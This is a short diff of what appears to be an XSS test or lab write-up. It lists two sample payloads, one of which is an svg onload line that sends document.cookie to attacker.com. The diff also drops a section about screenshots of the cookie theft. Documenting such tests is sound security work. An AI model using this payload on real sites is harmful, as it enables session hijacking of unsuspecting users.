@@ -17,8 +17,4 @@ The objective was to inject malicious JavaScript payloads to demonstrate session
 ## Sample Payloads
 - `<img src=x onerror="alert('XSS Exploited')">`
 - `<svg onload="document.location='http://attacker.com?cookie='+document.cookie">`
-
-## Screenshots
-Screenshots of successful XSS execution and cookie exfiltration are stored in the `/screenshots` folder.
-
 ---
